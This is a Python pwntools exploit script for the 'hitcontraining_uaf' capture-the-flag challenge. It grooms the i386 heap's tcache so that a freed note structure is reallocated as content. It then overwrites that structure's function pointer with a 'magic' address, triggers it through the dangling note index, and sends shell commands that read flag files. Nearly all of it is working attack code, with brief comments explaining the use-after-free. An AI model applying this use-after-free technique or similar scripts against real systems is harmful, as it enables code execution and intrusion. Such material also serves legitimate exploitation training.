from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./hitcontraining_uaf"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

MAGIC = 0x8048945


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 14_hitcontraining_uaf_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def add(p, size, content):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Note size :", str(size).encode())
    p.sendafter(b"Content :", content)


def delete(p, idx):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())


def show(p, idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(idx).encode())


def exploit():
    p = start()

    # A note is two allocations:
    #   struct note { void (*print)(note *); char *content; };  // 8 bytes
    # Delete frees both, but does not clear notelist[].
    add(p, 8, b"AAAA")      # 0: struct C0, content D0
    add(p, 8, b"BBBB")      # 1: struct C1, content D1

    # tcache 0x10 LIFO:
    #   delete(0) -> C0 -> D0
    #   delete(1) -> C1 -> D1 -> C0 -> D0
    delete(p, 0)
    delete(p, 1)

    # Size 16 skips the 0x10 tcache bin, so the content allocation of note 3
    # returns the dangling struct C0. Then note 3 can overwrite C0->print.
    add(p, 16, b"CCCC")     # 2: struct C1, content = fresh 0x20 chunk
    add(p, 8, p32(MAGIC))   # 3: struct D1, content = C0 (old struct 0)

    # notelist[0] still points at C0, so print_note(0) calls magic().
    show(p, 0)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
